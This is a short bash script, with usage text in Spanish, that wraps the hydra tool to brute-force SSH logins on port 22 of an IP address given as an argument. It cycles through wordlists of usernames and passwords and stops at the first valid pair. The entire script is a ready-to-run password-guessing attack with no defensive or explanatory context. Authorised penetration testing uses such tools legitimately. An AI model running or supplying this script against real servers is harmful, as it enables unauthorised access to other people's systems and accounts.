#!/bin/bash 
cat << "INFO"
bruteSSH2
INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a SSH."
        echo "Requiere hydra"
        echo "Uso.: sh brutessh3.sh <ip>"
        echo
        exit 0
fi
echo
echo
hydra $1 ssh -s 22 -L usuarios.txt -P claves.txt -f -t 3
